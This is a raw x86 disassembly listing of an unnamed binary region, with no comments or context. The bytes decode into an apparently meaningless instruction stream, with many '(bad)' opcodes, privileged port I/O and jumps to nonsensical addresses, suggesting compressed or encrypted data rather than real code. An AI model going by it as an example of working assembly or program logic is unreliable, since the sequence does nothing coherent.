  423e19:	fidiv  DWORD PTR [ecx-0x22]
  423e1c:	push   ebx
  423e1d:	xlat   BYTE PTR ds:[ebx]
  423e1e:	or     edx,DWORD PTR [edi-0x19]
  423e21:	and    eax,DWORD PTR [edi+ebp*8]
  423e24:	cdq    
  423e25:	(bad)  
  423e26:	das    
  423e27:	jne    0x423dbb
  423e29:	cwde   
  423e2a:	mov    cl,0xed
  423e2c:	xor    al,0x51
  423e2e:	lods   eax,DWORD PTR ds:[esi]
  423e2f:	mov    ds:0x1aaed61b,al
  423e34:	(bad)  
  423e36:	sub    edi,eax
  423e38:	inc    esp
  423e39:	call   0xae8ee33b
  423e3e:	daa    
  423e3f:	das    
  423e40:	cmp    al,0xa7
  423e42:	xchg   ebp,eax
  423e43:	ret    
  423e44:	add    BYTE PTR [esi+0x10],bh
  423e47:	mov    DWORD PTR [esi],edx
  423e49:	pusha  
  423e4a:	data16 mov cl,0xf4
  423e4d:	in     al,0x5b
  423e4f:	and    al,0x91
  423e51:	pop    ebx
  423e52:	lea    eax,[ebp+0x5574d6d4]
  423e58:	add    al,0x6c
  423e5a:	cmp    ebp,DWORD PTR [ebx-0x77]
  423e5d:	cmc    
  423e5e:	in     eax,0x10
  423e60:	ins    BYTE PTR es:[edi],dx
  423e61:	fmul   DWORD PTR [ebx-0x44]
  423e64:	std    
  423e65:	jl     0x423e12
  423e67:	xlat   BYTE PTR ds:[ebx]
  423e68:	rcl    DWORD PTR [esi-0x7ff68f5b],1
  423e6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e6f:	js     0x423ede
  423e71:	pop    edx
  423e72:	neg    DWORD PTR [ecx+0x20d051dd]
  423e78:	or     ebx,esi
  423e7a:	jmp    0x423e6f
  423e7c:	sbb    bl,cl
  423e7e:	mov    ebp,0x97e7a75a
  423e83:	mov    bh,0x20
  423e85:	aad    0xef
  423e87:	mov    WORD PTR [edi-0x3a],ss
  423e8a:	int    0xfb
  423e8c:	icebp  
  423e8d:	imul   esi,DWORD PTR [esi+ecx*4-0x7d],0xffffffe0
  423e92:	sbb    al,0xab
  423e94:	push   ss
  423e95:	push   ds
  423e96:	cdq    
  423e97:	hlt    
  423e98:	ins    BYTE PTR es:[edi],dx
  423e99:	lods   eax,DWORD PTR ds:[esi]
  423e9a:	inc    edx
  423e9b:	imul   ecx,DWORD PTR [ebx+0x32665a6b],0x56
  423ea2:	test   eax,0x2484e114
  423ea7:	add    eax,0xa34c2d0
  423eac:	xor    BYTE PTR [esi+0x7],0x9b
  423eb0:	jp     0x423e89
  423eb2:	test   eax,0xfd17
	...
  423f13:	add    BYTE PTR [eax],al
  423f15:	add    BYTE PTR [esi+0x74b9649a],ch
  423f1b:	(bad)  
  423f1c:	call   FWORD PTR [edi+0x5086f531]
  423f22:	loopne 0x423f9a
  423f24:	sbb    BYTE PTR [eax+0x17e9a],dl
  423f2a:	pop    es
  423f2b:	add    DWORD PTR [eax],eax
  423f2d:	add    ch,dl
  423f2f:	mov    eax,0x3b55dbd8
  423f34:	or     edx,DWORD PTR [eax-0x13]
  423f37:	jbe    0x423ec4
  423f39:	dec    esi
  423f3a:	rcl    bh,1
  423f3c:	rcl    BYTE PTR [esi-0x24836c9e],cl
  423f42:	inc    esp
  423f43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f44:	xchg   esp,eax
  423f45:	lahf   
  423f46:	lahf   
  423f47:	in     eax,dx
  423f48:	jo     0x423f61
  423f4a:	and    cl,al
  423f4c:	jmp    0x3d8a:0xcb10df6
  423f53:	sub    ebx,DWORD PTR [eax-0x17baee5e]
  423f59:	call   0xdc06:0xb616ff78
  423f60:	xlat   BYTE PTR ds:[ebx]
  423f61:	test   DWORD PTR [edi],0x743b5a34
  423f67:	mov    esi,0x53e0500
  423f6c:	xchg   ebx,eax
  423f6d:	js     0x423fd2
  423f6f:	iret   
  423f70:	add    al,0xec
  423f72:	adc    BYTE PTR [edx],dh
  423f74:	xchg   DWORD PTR [ecx],edi
  423f76:	push   0x4eaa4c75
  423f7b:	xchg   BYTE PTR ds:0x6189bdda,ch
  423f81:	cmp    eax,0x41a67d96
  423f86:	xor    al,0xa5
  423f88:	dec    ebp
  423f89:	(bad)  
  423f8b:	jmp    0x423f5c
  423f8d:	mov    ds:0xe5b174c,al
  423f92:	push   0x7d281762
  423f97:	repz xor DWORD PTR [eax-0x19],eax
  423f9b:	mov    ds:0x3f39d007,eax
  423fa0:	ins    DWORD PTR es:[edi],dx
  423fa1:	push   edx
  423fa2:	cmp    al,0xb
  423fa4:	cmp    DWORD PTR [eax],edx
  423fa6:	pop    es
  423fa7:	xchg   ecx,eax
  423fa8:	iret   
  423fa9:	or     ecx,ebx
  423fab:	cmc    
  423fac:	or     eax,0x152277c7
  423fb1:	xlat   BYTE PTR ds:[ebx]
  423fb2:	pusha  
  423fb3:	mov    esp,0xd3be75a1
  423fb8:	pushf  
  423fb9:	add    DWORD PTR [ebx+0x39],0xffffffd1
  423fbd:	call   0x74e5:0xe46204cc
  423fc4:	sub    al,0x35
  423fc6:	jmp    0x73ebad86
  423fcb:	stos   BYTE PTR es:[edi],al
  423fcc:	lahf   
  423fcd:	fcom   QWORD PTR [ebx+0x70]
  423fd0:	in     al,0xe3
  423fd2:	and    eax,0x938d1
  423fd7:	cmp    al,dh
  423fd9:	leave  
  423fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fdb:	push   eax
  423fdc:	dec    ebx
  423fdd:	push   ebx
  423fde:	es push es
  423fe0:	outs   dx,DWORD PTR ds:[esi]
  423fe1:	mov    ah,0x7a
  423fe3:	pcmpgtb mm7,QWORD PTR [ebx]
  423fe6:	leave  
  423fe7:	test   eax,0x967dc3a2
  423fec:	dec    eax
  423fed:	stos   DWORD PTR es:[edi],eax
  423fee:	enter  0x45d,0x60
  423ff2:	inc    esi
  423ff3:	push   0x7c
  423ff5:	add    ebx,esp
  423ff7:	imul   edx,esi,0x3a
  423ffa:	xchg   ecx,eax
  423ffb:	arpl   WORD PTR [edi+0x6c],cx
  423ffe:	sub    al,0x3
  424000:	ins    BYTE PTR es:[edi],dx
  424001:	push   ss
  424002:	in     eax,0x24
  424004:	dec    ecx
  424005:	cli    
  424006:	lahf   
  424007:	lahf   
  424008:	push   esi
  424009:	jno    0x423f96
  42400b:	mov    ?,WORD PTR [eax+ebx*2]
  42400e:	jns    0x42403d
  424010:	or     DWORD PTR [edi],0xb790827a
  424016:	cmp    al,BYTE PTR [esi+0x7adec99e]
  42401c:	xchg   ebp,eax
  42401d:	pop    edx
  42401e:	mov    gs,WORD PTR [esi+0x7b]
  424021:	mov    ebx,0xe8bb7820
  424026:	aad    0x7
  424028:	call   0x107063ee
  42402d:	inc    edx
  42402e:	push   es
  42402f:	ss jns 0x423fd9
  424032:	retf   0x9533
	...
  424095:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  424099:	mov    cl,0x2e
  42409b:	idiv   edi
  42409d:	fnsave [edi-0x4b55e30f]
  4240a3:	pop    ebp
  4240a4:	adc    eax,0x17fa1fc
  4240a9:	add    BYTE PTR [edi],al
  4240ab:	add    DWORD PTR [eax],eax
  4240ad:	add    BYTE PTR [edi+0x4b],ah
  4240b0:	dec    edx
  4240b1:	sub    al,0x92
  4240b3:	dec    ebp
  4240b4:	cmp    BYTE PTR [ecx+0x28],ch
  4240b7:	into   
  4240b8:	push   esi
  4240b9:	pop    esi
  4240ba:	push   ss
  4240bb:	test   BYTE PTR [edi+0x1aaa74d7],dh
  4240c1:	jbe    0x4240a0
  4240c3:	iret   
  4240c4:	adc    ah,dh
  4240c6:	out    dx,eax
  4240c7:	xlat   BYTE PTR ds:[ebx]
  4240c8:	fs jae 0x424093
  4240cb:	jmp    0x528c:0x9c2a1c26
  4240d2:	nop
  4240d3:	popa   
  4240d4:	rol    BYTE PTR [ebp+ebp*1-0x1f4d5a94],cl
  4240db:	je     0x4240c4
  4240dd:	mov    eax,ds:0xdcb2daad
  4240e2:	cli    
  4240e3:	call   0x5efd5e77
  4240e8:	pop    eax
  4240e9:	(bad)  
  4240ea:	(bad)  
  4240eb:	mov    BYTE PTR [edx-0x6a3f50f],bh
  4240f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240f2:	imul   esp,DWORD PTR [esi+0x57e11020],0x42
  4240f9:	test   eax,0xda95ab2b
  4240fe:	in     al,0xa1
  424100:	popf   
  424101:	cmp    al,0x70
  424103:	mov    edi,0x8f6063ad
  424108:	out    0x28,eax
  42410a:	fsub   DWORD PTR [eax-0x541c061b]
  424110:	test   BYTE PTR [esi+0x41],ah
  424113:	mov    ds:0xff1f4b36,eax
  424118:	mov    eax,0x6033b557
  42411d:	les    esp,FWORD PTR ss:[ebx]
  424120:	shl    ah,cl
  424122:	mov    ah,0xb4
  424124:	mov    ch,0x40
  424126:	push   ebx
  424127:	(bad)  
  424128:	(bad)  
  424129:	repnz sbb ebp,DWORD PTR [ecx+0x3499662]
  424130:	jae    0x424181
  424132:	mov    ch,0xf8
  424134:	fcomp  DWORD PTR [ebx-0x75]
  424137:	pop    esi
  424138:	push   edx
  424139:	aaa    
  42413a:	enter  0x3fa7,0xee
  42413e:	xor    DWORD PTR [ebx+ebx*1],esp
  424141:	imul   ecx,DWORD PTR [ebp-0xb],0x5a
  424145:	hlt    
  424146:	add    BYTE PTR [edx+0x33686e4f],0xf6
  42414d:	adc    BYTE PTR [ebx+0x636249e6],dh
  424153:	(bad)  
  424154:	les    ebx,FWORD PTR [eax+0x7f9eb56]
  42415a:	aas    
  42415b:	fisubr DWORD PTR [ebx-0x1f4e6ae3]
  424161:	and    DWORD PTR [esi+0x13da2291],edx
  424167:	mov    ch,0x53
  424169:	mov    al,0xd0
  42416b:	or     al,0xd6
  42416d:	jl     0x42419f
  42416f:	xor    edx,ecx
  424171:	cld    
  424172:	loopne 0x4241a8
  424174:	push   ds
  424175:	aam    0xa7
  424177:	push   cs
  424178:	mov    edx,0xac2f7160
  42417d:	int    0x76
  42417f:	retf   0x44b
  424182:	sbb    DWORD PTR [ebp+0x6e1f681d],edi
  424188:	jecxz  0x42414a
  42418a:	ins    DWORD PTR es:[edi],dx
  42418b:	test   DWORD PTR [ecx+0x2],esp
  42418e:	and    BYTE PTR [edx+0x38],ah
  424191:	mov    al,ds:0x47a16d22
  424196:	ret    
  424197:	xchg   ebp,eax
  424198:	rcr    BYTE PTR [ecx+0x5c],0xb5
  42419c:	fdivp  st(2),st
  42419e:	or     ebp,ecx
  4241a0:	sbb    DWORD PTR [edx+esi*4+0x7b],0x8
  4241a5:	push   esp
  4241a6:	xchg   esi,eax
  4241a7:	out    dx,eax
  4241a8:	mov    ah,0x50
  4241aa:	out    0xc2,eax
  4241ac:	repz lds si,DWORD PTR [ebx-0x38819710]
  4241b4:	add    BYTE PTR [eax],0x0
	...
  424213:	add    BYTE PTR [eax],al
  424215:	add    BYTE PTR [edi-0x4c275c4c],al
  42421b:	(bad)  
  42421d:	call   DWORD PTR [edi+0x5bd4b417]
  424223:	inc    eax
  424224:	ss xchg ebp,eax
  424226:	test   al,0x80
  424228:	add    DWORD PTR [eax],eax
  42422a:	pop    es
  42422b:	add    DWORD PTR [eax],eax
  42422d:	add    BYTE PTR [esp+ebx*2-0x37],dl
  424231:	sub    eax,0x41409a58
  424236:	mov    cl,0xdc
  424238:	loop   0x42421c
  42423a:	out    dx,al
  42423b:	test   dl,dh
  42423d:	and    DWORD PTR [esi-0x45741894],0x501223b5
  424247:	frstor [esi-0x40a1a42a]
  42424d:	or     eax,0x4e098ed2
  424252:	out    0xe8,al
  424254:	(bad)  
  424255:	loopne 0x42429f
  424257:	jmp    0x8653:0x630c48d7
  42425e:	xor    DWORD PTR [eax+0x6a0b2c89],0xd1e4c728
  424268:	jle    0x424247
  42426a:	pushf  
  42426b:	jge    0x424266
  42426d:	inc    eax
  42426e:	sbb    ebx,edi
  424270:	test   edi,eax
  424272:	mov    edi,0xa61d64a3
  424277:	add    bl,BYTE PTR [ebx-0x36cbb474]
  42427d:	shl    DWORD PTR [edi],0x91
  424280:	ret    
  424281:	test   DWORD PTR [ebx+0x5b],ebp
  424284:	push   ecx
  424285:	and    BYTE PTR [esi+0x4ec31317],bl
  42428b:	add    BYTE PTR [ecx-0x420f7954],cl
  424291:	mov    eax,0x766caa85
  424296:	test   DWORD PTR [esi],eax
  424298:	rol    ebp,1
  42429a:	jmp    0x5e14:0x296fe4cf
  4242a1:	dec    ebx
  4242a2:	sub    al,0xcd
  4242a4:	mov    al,0xeb
  4242a6:	scas   eax,DWORD PTR es:[edi]
  4242a7:	stc    
  4242a8:	adc    ch,0x70
  4242ab:	and    cl,0xaf
  4242ae:	dec    DWORD PTR [ecx]
  4242b0:	sbb    al,BYTE PTR [ebx]
  4242b2:	or     dh,BYTE PTR [edi]
  4242b4:	mov    eax,0xe9ff590c
  4242b9:	inc    esi
  4242ba:	dec    ebx
  4242bb:	imul   ecx,DWORD PTR [ebp-0x549e13c],0x6a1abb90
  4242c5:	gs push es
  4242c7:	push   esp
  4242c8:	test   al,0x19
  4242ca:	pop    ebp
  4242cb:	jbe    0x424313
  4242cd:	pop    es
  4242ce:	mov    dl,0x2a
  4242d0:	sub    eax,ecx
  4242d2:	pop    ecx
  4242d3:	aaa    
  4242d4:	test   edi,edx
  4242d6:	cmp    DWORD PTR [esi+eiz*8+0x6c],eax
  4242da:	push   ebx
  4242db:	or     ch,BYTE PTR [ebp-0x68]
  4242de:	and    al,0x3f
  4242e0:	mov    eax,ds:0xa31d7b4c
  4242e5:	pop    esi
  4242e6:	mov    dl,0x8a
  4242e8:	in     eax,dx
  4242e9:	jns    0x424276
  4242eb:	mov    al,ds:0x3d9949bd
  4242f0:	iret   
  4242f1:	xchg   esp,eax
  4242f2:	xor    ebx,0xe3095f9
  4242f8:	xor    eax,0x63cd0e89
  4242fd:	push   es
  4242fe:	xlat   BYTE PTR ds:[ebx]
  4242ff:	mov    bl,0x4e
  424301:	xchg   edx,eax
  424302:	mov    ebx,0xbf8773b5
  424307:	pop    ss
  424308:	mov    esi,0xead5494c
  42430d:	imul   esi,DWORD PTR [esi],0xeb63f95b
  424313:	dec    edx
  424314:	sahf   
  424315:	adc    BYTE PTR [ecx-0x2bed2296],bl
  42431b:	ins    DWORD PTR es:[edi],dx
  42431c:	cmp    ch,al
  42431e:	inc    eax
  42431f:	sti    
  424320:	stos   DWORD PTR es:[edi],eax
  424321:	aad    0x61
  424323:	add    ah,ah
  424325:	pop    eax
  424326:	or     BYTE PTR [edi+0x1a2c73ec],dl
  42432c:	cmp    bh,BYTE PTR [edx+0x392096e0]
  424332:	imul   edi,ebp,0x7a
	...
  424394:	add    BYTE PTR [eax],al
  424396:	mov    ah,BYTE PTR [esi]
  424398:	jge    0x424354
  42439a:	std    
  42439b:	sti    
  42439c:	iret   
  42439d:	test   DWORD PTR ss:[ebx],ebx
  4243a0:	sub    edx,ebp
  4243a2:	out    0x4a,al
  4243a4:	and    ecx,DWORD PTR [ebp+0x181af]
  4243aa:	pop    es
  4243ab:	add    DWORD PTR [eax],eax
  4243ad:	add    BYTE PTR [edx+esi*2-0x7c9a4436],dl
  4243b4:	xchg   edx,eax
  4243b5:	icebp  
  4243b6:	fwait
  4243b7:	repz push edx
  4243b9:	mov    edi,0xbaddd419
  4243be:	xchg   DWORD PTR [ecx+0x22],edx
  4243c1:	push   ecx
  4243c2:	das    
  4243c3:	push   ebp
  4243c4:	fadd   QWORD PTR [ebx+0x60]
  4243c7:	scas   eax,DWORD PTR es:[edi]
  4243c8:	xor    eax,edx
  4243ca:	fwait
  4243cb:	xchg   BYTE PTR [ecx-0x7b],ch
  4243ce:	xor    DWORD PTR [ecx],eax
  4243d0:	inc    ebx
  4243d1:	push   esi
  4243d2:	sbb    ebx,DWORD PTR [ecx-0x46]
  4243d5:	jmp    FWORD PTR [edx]
  4243d7:	(bad)  
  4243d8:	push   ebp
  4243d9:	mov    eax,0x917f6398
  4243de:	dec    esp
  4243df:	fs dec ecx
  4243e1:	mov    ds:0xe78c0728,eax
  4243e6:	push   es
  4243e7:	add    ebx,DWORD PTR [esi-0x1d669d3]
  4243ed:	pop    es
  4243ee:	push   0x8cda0b2b
  4243f3:	mov    ebx,0x86b3d0eb
  4243f8:	or     BYTE PTR [ecx],0xdd
  4243fb:	jl     0x42440a
  4243fd:	add    DWORD PTR [edi],esp
  4243ff:	pop    edx
  424400:	sub    ebx,edx
  424402:	mov    cl,0xdb
  424404:	ins    BYTE PTR es:[edi],dx
  424405:	xchg   ebp,eax
  424406:	dec    edx
  424407:	lds    ebx,FWORD PTR [edi]
  424409:	jno    0x424444
  42440b:	sbb    al,BYTE PTR [ebx]
  42440d:	push   cs
  42440e:	loop   0x4243a8
  424410:	mov    dl,0x5
  424412:	or     ch,cl
  424414:	shl    DWORD PTR [ecx],0x7a
  424417:	lods   al,BYTE PTR ds:[esi]
  424418:	mov    bh,0x58
  42441a:	fstp   TBYTE PTR [edi-0x60700f93]
  424420:	rol    BYTE PTR [edx],1
  424422:	xor    DWORD PTR [ecx],0xffffffce
  424425:	inc    edx
  424426:	pop    DWORD PTR ss:[ebp-0x78]
  42442a:	pop    esi
  42442b:	fnsave [edi+0xd6167b6]
  424431:	mov    esi,0xbb46988e
  424436:	push   0xfd992945
  42443b:	into   
  42443c:	adc    eax,0x4d01e3f4
  424441:	cdq    
  424442:	js     0x4244b8
  424444:	mov    edx,0x60b57779
  424449:	or     eax,0x7042be6b
  42444e:	addr16 rcr eax,0x7
  424452:	enter  0x485,0x3
  424456:	cmp    edx,DWORD PTR [ebx+0x7e]
  424459:	xchg   esp,eax
  42445a:	and    DWORD PTR [ebp+ebp*2-0x3a690733],0x2f
  424462:	xchg   ebp,eax
  424463:	lock test al,0xbb
  424466:	dec    edi
  424467:	(bad)  
  424468:	neg    BYTE PTR [ecx]
  42446a:	and    DWORD PTR [ebp+0x78c46e54],edx
  424470:	add    al,0x71
  424472:	and    DWORD PTR [bp+di+0x1],ecx
  424476:	jb     0x424434
  424478:	adc    cl,BYTE PTR [edx]
  42447a:	addr16 js 0x4244c5
  42447d:	rol    BYTE PTR [edx-0x7f],0x29
  424481:	push   ebx
  424482:	data16 sahf 
  424484:	and    bl,BYTE PTR [esi+esi*8-0x4a493277]
  42448b:	mov    dh,0x11
  42448d:	leave  
  42448e:	sbb    BYTE PTR [ebp+0x72],ch
  424491:	or     BYTE PTR [esp+edi*4+0x73],0x8f
  424496:	repnz sar DWORD PTR [eax+eax*8],cl
  42449a:	push   edi
  42449b:	push   ebx
  42449c:	int3   
  42449d:	push   cs
  42449e:	sub    BYTE PTR [ecx],ah
  4244a0:	or     esp,DWORD PTR [ebp+edx*2-0x18]
  4244a4:	and    BYTE PTR [ebp-0x3a],dl
  4244a7:	popa   
  4244a8:	daa    
  4244a9:	or     BYTE PTR [ecx-0x50],bh
  4244ac:	rcr    DWORD PTR [edx],1
  4244ae:	test   BYTE PTR [ebx+0x61],dl
  4244b1:	scas   al,BYTE PTR es:[edi]
  4244b2:	mov    ebp,0xbe77
	...
  424513:	add    BYTE PTR [eax],al
  424515:	add    al,ah
  424517:	outs   dx,DWORD PTR ds:[esi]
  424518:	xchg   esi,eax
  424519:	inc    edx
  42451a:	lahf   
  42451b:	sti    
  42451c:	hlt    
  42451d:	out    dx,eax
  42451e:	mov    al,ds:0xfe0ff3ab
  424523:	xchg   esp,eax
  424524:	fs (bad) 
  424526:	mov    dh,0x82
  424528:	add    DWORD PTR [eax],eax
  42452a:	pop    es
  42452b:	add    DWORD PTR [eax],eax
  42452d:	add    al,cl
  42452f:	cmc    
  424530:	xchg   edi,eax
  424531:	jmp    DWORD PTR [esi+0x4e35a747]
  424537:	pop    esi
  424538:	sbb    al,dh
  42453a:	mov    ss,WORD PTR [ebx-0xb]
  42453d:	xor    eax,DWORD PTR [eax]
  42453f:	dec    ebx
  424540:	mov    al,ds:0x438049ba
  424545:	retf   
  424546:	loop   0x4244fa
  424548:	in     al,0x99
  42454a:	clc    
  42454b:	int    0xa9
  42454d:	jnp    0x424590
  42454f:	jb     0x42450f
  424551:	popf   
  424552:	in     al,dx
  424553:	pushfw 
  424555:	scas   eax,DWORD PTR es:[edi]
  424556:	loopne 0x4245d7
  424558:	add    ebp,DWORD PTR [ebx]
  42455a:	mov    DWORD PTR [edx],ecx
  42455c:	jns    0x424540
  42455e:	mov    al,ah
  424560:	cwde   
  424561:	adc    dh,BYTE PTR [ebx+0x17]
  424564:	shr    DWORD PTR [edi+0x2430ea9b],0x14
  42456b:	pop    ebp
  42456c:	punpcklbw mm7,mm7
  42456f:	xlat   BYTE PTR ds:[ebx]
  424570:	pushf  
  424571:	push   0x933c8e10
  424576:	mov    edi,0x68ddd8d2
  42457b:	jg     0x424586
  42457d:	and    BYTE PTR [esi-0x5],ch
  424580:	fimul  WORD PTR [edi-0x7d69becd]
  424586:	dec    ecx
  424587:	inc    eax
  424588:	imul   ebx,ebx,0xffffffe8
  42458b:	xchg   esp,eax
  42458c:	and    DWORD PTR [ebx],eax
  42458e:	rcl    BYTE PTR [esi-0x345f2584],0xf
  424595:	lods   al,BYTE PTR ds:[esi]
  424596:	mov    eax,0x140e036a
  42459b:	arpl   WORD PTR [ecx+0x3f],bx
  42459e:	sbb    DWORD PTR [esi],ebx
  4245a0:	pop    ss
  4245a1:	popf   
  4245a2:	aam    0x20
  4245a4:	xchg   esi,eax
  4245a5:	pmaxub mm2,QWORD PTR [eax+0x3]
  4245a9:	pop    edi
  4245aa:	mov    ch,0x3c
  4245ac:	cmp    eax,0x1fde4c73
  4245b1:	push   edx
  4245b2:	lea    edi,[ebp+0x61d1addb]
  4245b8:	ret    0x3d51
  4245bb:	add    DWORD PTR [edi+0x39f0bf53],ebp
  4245c1:	loopne 0x4245b1
  4245c3:	out    0x4f,al
  4245c5:	mov    dl,0x8b
  4245c7:	jecxz  0x42463f
  4245c9:	dec    cl
  4245cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4245cc:	mov    dh,0x65
  4245ce:	outs   dx,BYTE PTR ds:[esi]
  4245cf:	jbe    0x424649
  4245d1:	jmp    0xecc1:0xaa8fe66
  4245d8:	xlat   BYTE PTR ds:[ebx]
  4245d9:	in     eax,dx
  4245da:	lock (bad) 
  4245dc:	in     al,dx
  4245dd:	adc    edi,DWORD PTR [edi+0x4c]
  4245e0:	int    0x48
  4245e2:	add    DWORD PTR [eax-0x54],esi
  4245e5:	stos   BYTE PTR es:[edi],al
  4245e6:	jne    0x424629
  4245e8:	mov    esi,DWORD PTR [eax-0x191f7e0b]
  4245ee:	xchg   edx,eax
  4245ef:	fucom  st(0)
  4245f1:	in     al,dx
  4245f2:	xchg   DWORD PTR [ebp+edx*1-0x2e],ebp
  4245f6:	fbld   TBYTE PTR [eax]
  4245f8:	and    BYTE PTR [edx],al
  4245fa:	ss sub al,0xb7
  4245fd:	in     al,0xf
  4245ff:	leave  
  424600:	ins    BYTE PTR es:[edi],dx
  424601:	lock int 0xce
  424604:	push   esp
  424605:	cmc    
  424606:	xor    cl,BYTE PTR [edi+0x1928b5c7]
  42460c:	aam    0x2a
  42460e:	mov    ecx,0x9abe7022
  424613:	push   eax
  424614:	(bad)  
  424615:	enter  0xaac1,0xfd
  424619:	adc    ebx,DWORD PTR [eax+0x78]
  42461c:	std    
  42461d:	push   esp
  42461e:	lea    ebx,[edi-0x2b4d1cd8]
  424624:	test   eax,0xac53a66b
  424629:	xor    bh,dh
  42462b:	mov    ebx,0xd3b3b2c4
  424630:	pop    edx
  424631:	push   edi
  424632:	inc    esi
  424633:	in     eax,0x5d
	...
  424695:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42469c:	mov    edi,0x8f38d4d3
  4246a1:	cmp    edi,DWORD PTR [edi+0x35]
  4246a4:	les    ecx,FWORD PTR [ecx-0x43]
  4246a7:	add    DWORD PTR [ecx],0x0
  4246aa:	pop    es
  4246ab:	add    DWORD PTR [eax],eax
  4246ad:	add    BYTE PTR [ecx+eiz*1+0x3c5e8c4c],dh
  4246b4:	sbb    eax,0x89a70eb8
  4246b9:	cmc    
  4246ba:	retf   
  4246bb:	les    edi,FWORD PTR [ebp-0x47]
  4246be:	adc    eax,0x7fe8d279
  4246c3:	cli    
  4246c4:	xor    al,0x8d
  4246c6:	fistp  QWORD PTR [edi-0x3f]
  4246c9:	add    ah,BYTE PTR [ebx-0x45a10794]
  4246cf:	imul   edi,ebp,0xf2742686
  4246d5:	mov    ebx,0x43e62f45
  4246da:	lods   eax,DWORD PTR ds:[esi]
  4246db:	retf   0xb787
  4246de:	enter  0xf7b6,0xa2
  4246e2:	sub    al,0x91
  4246e4:	sbb    ebx,DWORD PTR [eax+0x48]
  4246e7:	pusha  
  4246e8:	loope  0x424698
  4246ea:	push   esi
  4246eb:	push   eax
  4246ec:	pop    ss
  4246ed:	sub    eax,0x5cedf99b
  4246f2:	dec    esp
  4246f3:	jle    0x424722
  4246f5:	jns    0x4246c1
  4246f7:	repz out dx,eax
  4246f9:	ror    BYTE PTR [edi+0x31],1
  4246fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4246fd:	mov    ds:0xad94462d,eax
  424702:	sub    al,0x2
  424704:	or     ch,0x6b
  424707:	ror    bh,cl
  424709:	fidivr WORD PTR [esi]
  42470b:	adc    eax,0xc0241e96
  424710:	lds    edi,FWORD PTR [edx+0x3e455e95]
  424716:	or     esi,DWORD PTR [ebx]
  424718:	rcr    DWORD PTR [edi],1
  42471a:	sub    ah,0x80
  42471d:	sbb    edx,DWORD PTR [esi+esi*4+0x54d8aea0]
  424724:	xor    eax,edx
  424726:	push   cs
  424727:	jmp    0x86a7240e
  42472c:	mov    ds:0x25d10b1,al
  424731:	popf   
  424732:	sbb    al,0x69
  424734:	add    BYTE PTR [edx+edi*2],dl
  424737:	out    0x87,al
  424739:	add    esi,DWORD PTR [esi]
  42473b:	repz mov esp,0xe92f29d
  424741:	or     BYTE PTR [ebx-0x6594fff2],bh
  424747:	ja     0x4246cc
  424749:	or     eax,DWORD PTR [edi-0x4a8fdda5]
  42474f:	fdiv   QWORD PTR [edx]
  424751:	sub    al,BYTE PTR [edi-0x4c]
  424754:	repz imul ebx,DWORD PTR [eax],0x37c74000
  42475b:	enter  0x1dcc,0xce
  42475f:	cld    
  424760:	dec    eax
  424761:	jmp    DWORD PTR [edx+eiz*8+0x64d8de53]
  424768:	cmp    BYTE PTR [ecx-0x2e],bl
  42476b:	xor    al,0x8c
  42476d:	cmp    BYTE PTR [esi-0x3f],0xf7
  424771:	mov    ds:0xcfd6bc4b,al
  424776:	test   ecx,esi
  424778:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424779:	out    0x83,eax
  42477b:	gs adc eax,0xcac0fda7
  424781:	ret    0xe66a
  424784:	cmp    esi,DWORD PTR [ecx+eiz*2]
  424787:	cdq    
  424788:	adc    DWORD PTR [esi-0x472a910],eax
  42478e:	and    DWORD PTR [eax],edx
  424790:	sbb    eax,0xeeb7a69
  424795:	adc    al,0x81
  424797:	ins    BYTE PTR es:[edi],dx
  424798:	push   eax
  424799:	jge    0x42478d
  42479b:	xchg   DWORD PTR [eax-0x23],ebp
  42479e:	pop    ecx
  42479f:	sub    DWORD PTR [edi-0x44],esp
  4247a2:	je     0x4247d3
  4247a4:	add    esp,DWORD PTR [edx+0x19]
  4247a7:	sub    BYTE PTR [ecx],0x38
  4247aa:	jb     0x42474a
  4247ac:	ds cmc 
  4247ae:	fsubr  DWORD PTR [ebp-0x6b0bc7dc]
  4247b4:	rol    BYTE PTR [eax],cl
	...
  424816:	and    bl,BYTE PTR [eax-0x7c]
  424819:	out    dx,eax
  42481a:	(bad)  
  42481b:	jmp    FWORD PTR [ebx-0x23]
  42481e:	rol    DWORD PTR [eax-0x22e407de],0xbc
  424825:	leave  
  424826:	les    eax,FWORD PTR [ecx+eax*1+0x10700]
  42482d:	add    cl,cl
  42482f:	sub    al,0x63
  424831:	jg     0x42483e
  424833:	test   al,ah
  424835:	xchg   ebx,eax
  424836:	xchg   esi,eax
  424837:	push   ebx
  424838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424839:	xchg   ecx,eax
  42483a:	pushf  
  42483b:	xchg   esi,eax
  42483c:	add    DWORD PTR [esi+0x2221af86],edx
  424842:	inc    ecx
  424843:	pop    eax
  424844:	push   ebp
  424845:	push   ecx
  424846:	fidivr DWORD PTR [ecx+0x5ae89721]
  42484c:	adc    ah,ch
  42484e:	arpl   WORD PTR [esi-0x37],cx
  424851:	cmp    eax,eax
  424853:	add    dl,dl
  424855:	dec    edx
  424856:	test   al,0xbf
  424858:	sbb    dl,cl
  42485a:	es enter 0xe50c,0xab
  42485f:	lahf   
  424860:	mov    ss,esp
  424862:	push   0x4b22addf
  424867:	xchg   esp,eax
  424868:	mov    al,0x6c
  42486a:	bound  esi,QWORD PTR [edi]
  42486c:	in     al,dx
  42486d:	sub    esp,0x7a
  424870:	int3   
  424871:	xchg   sp,ax
  424873:	cmp    DWORD PTR ds:0x269c0123,ebx
  424879:	cdq    
  42487a:	fbld   TBYTE PTR [esi-0x51]
  42487d:	or     al,0xf
  42487f:	aaa    
  424880:	ins    BYTE PTR es:[edi],dx
  424881:	mov    ebp,0x9a2dba3
  424886:	imul   ecx,DWORD PTR [ecx-0x4d],0x4b
  42488a:	jge    0x4248b8
  42488c:	xor    dh,ah
  42488e:	xchg   ebx,edi
  424890:	lock in al,dx
  424892:	rol    BYTE PTR [ebx],cl
  424894:	stos   BYTE PTR es:[edi],al
  424895:	sbb    al,0x80
  424897:	adc    bl,BYTE PTR [ebp+eax*8+0x2e]
